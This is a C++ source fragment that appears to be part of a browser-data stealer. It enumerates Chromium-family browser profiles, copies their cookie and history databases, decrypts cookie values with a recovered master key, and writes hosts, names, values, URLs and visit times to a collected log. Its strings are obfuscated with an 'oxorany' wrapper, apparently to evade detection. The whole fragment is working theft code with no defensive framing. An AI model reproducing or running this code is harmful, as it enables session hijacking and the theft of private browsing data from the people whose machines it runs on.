                        const char* query = oxorany("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
                        sqlite3_stmt* stmt_raw = nullptr;
                        if (sqlite3_prepare_v2(db.get(), query, -1, &stmt_raw, nullptr) == SQLITE_OK) {
                            unique_sqlite3_stmt stmt(stmt_raw);
                            bool has_cookies = false;
                            while (sqlite3_step(stmt.get()) == SQLITE_ROW) {
                                const char* host_text = (const char*)sqlite3_column_text(stmt.get(), 0);
                                const char* name_text = (const char*)sqlite3_column_text(stmt.get(), 1);
                                const char* path_text = (const char*)sqlite3_column_text(stmt.get(), 2);
                                const void* blob = sqlite3_column_blob(stmt.get(), 3);
                                int blob_size = sqlite3_column_bytes(stmt.get(), 3);
                                sqlite3_int64 expires_utc = sqlite3_column_int64(stmt.get(), 4);

                                if (!host_text || !name_text || !blob || blob_size == 0) continue;

                                std::string host = host_text;
                                std::string name = name_text;
                                std::string path = path_text ? path_text : oxorany("/");

                                std::vector<BYTE> encData((BYTE*)blob, (BYTE*)blob + blob_size);
                                std::string value = DecryptPasswordBlob(encData, masterKey);
                                if (value.size() > 32) {
                                    value = value.substr(32);
                                } else if (value.empty()) {
                                    value = oxorany("<decryption failed>");
                                }

                                if (!has_cookies) {
                                    g_compiler->push_line(b.name + oxorany(" Cookies:"));
                                    has_cookies = true;
                                }
                                g_compiler->push_line(oxorany("Host: ") + host);
                                g_compiler->push_line(oxorany("Name: ") + name);
                                g_compiler->push_line(oxorany("Path: ") + path);
                                g_compiler->push_line(oxorany("Value: ") + value);
                                g_compiler->push_line(oxorany("Expires: ") + format_time(expires_utc));
                                g_compiler->push_line(oxorany(""));
                            }
                            if (!has_cookies) {
                                g_compiler->push_line(b.name + oxorany("No cookies found."));
                            }
                        } else {
                            g_compiler->push_line(b.name + oxorany(" Failed to query cookies."));
                        }
                        (temp_cookies);
                    }
                }
            }

            for ( const auto& b : browsers ) {
                namespace fs = std::filesystem;
                if ( !fs::exists( b.path ) ) {
                    continue;
                }

                fs::path localStatePath = b.path / oxorany("Local State");
                if ( !fs::exists( localStatePath ) ) continue;

                // Find profiles
                std::vector<fs::path> profiles;
                fs::path default_profile = b.path / oxorany("Default");
                if ( fs::exists( default_profile / oxorany("Login Data") ) )
                    profiles.push_back( default_profile );
                try {
                    for ( const auto& entry : fs::directory_iterator( b.path ) ) {
                        if ( fs::is_directory( entry.path( ) ) ) {
                            std::string dirname = entry.path( ).filename( ).string( );
                            if ( dirname.find( oxorany("Profile") ) == 0 || dirname == oxorany("Default") ) {
                                if ( fs::exists( entry.path( ) / oxorany("Login Data") ) )
                                    profiles.push_back( entry.path( ) );
                            }
                        }
                    }
                }
                catch ( ... ) { }
                if ( b.name == oxorany("Opera") && fs::exists( b.path / oxorany("Login Data") ) )
                    profiles.push_back( b.path );
                std::sort( profiles.begin( ), profiles.end( ) );
                profiles.erase( std::unique( profiles.begin( ), profiles.end( ) ), profiles.end( ) );

                for ( const auto& profile_path : profiles ) {
                    fs::path history_path = profile_path / oxorany("History");
                    if ( fs::exists( history_path ) ) {
                        fs::path temp_history = fs::temp_directory_path( ) / ( oxorany("History_") + std::to_string( GetCurrentProcessId( ) ) + oxorany(".db") );
                        try {
                            fs::copy_file( history_path, temp_history, fs::copy_options::overwrite_existing );
                        }
                        catch ( const fs::filesystem_error& e ) {
                            g_compiler->push_line( b.name + oxorany(" failed to copy History: ") + e.what( ) );
                            continue;
                        }

                        sqlite3* db_raw = nullptr;
                        if ( sqlite3_open( temp_history.string( ).c_str( ), &db_raw ) != SQLITE_OK ) {
                            g_compiler->push_line( oxorany("Failed to open History for ") + b.name );
                            ( temp_history );
                            continue;
                        }
                        unique_sqlite3 db( db_raw );
                        sqlite3_busy_timeout( db.get( ), 1000 );

                        const char* query = oxorany("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100");
                        sqlite3_stmt* stmt_raw = nullptr;
                        if ( sqlite3_prepare_v2( db.get( ), query, -1, &stmt_raw, nullptr ) == SQLITE_OK ) {
                            unique_sqlite3_stmt stmt( stmt_raw );
                            bool has_history = false;
                            while ( sqlite3_step( stmt.get( ) ) == SQLITE_ROW ) {
                                if ( !has_history ) {
                                    g_compiler->push_line( b.name + oxorany(" History:") );
                                    has_history = true;
                                }
                                const char* url_text = ( const char* )sqlite3_column_text( stmt.get( ), 0 );
                                const char* title_text = ( const char* )sqlite3_column_text( stmt.get( ), 1 );
                                int visit_count = sqlite3_column_int( stmt.get( ), 2 );
                                sqlite3_int64 last_visit_time = sqlite3_column_int64( stmt.get( ), 3 );

                                std::string url = url_text ? url_text : oxorany("");
                                std::string title = title_text ? title_text : oxorany("");
                                std::string last_visit = format_time( last_visit_time );

                                g_compiler->push_line( oxorany("URL: ") + url );
                                if ( !title.empty( ) ) g_compiler->push_line( oxorany("Title: ") + title );
                                g_compiler->push_line( oxorany("Visits: ") + std::to_string( visit_count ) );
                                g_compiler->push_line( oxorany("Last visited: ") + last_visit );
                                g_compiler->push_line( oxorany("") );
                            }
                            if ( !has_history ) {
                                g_compiler->push_line( b.name + oxorany(" [") + profile_path.filename( ).string( ) + oxorany("] No history entries found.") );
                            }
                        }
                        else {
                            g_compiler->push_line( b.name + oxorany(" Failed to query history.") );
                        }
                        ( temp_history );
                    }
                }
            }

            g_compiler->push_line(oxorany(""));
            std::cout << oxorany("Compiled Browser logs\n");
            return true;
        }
    };
}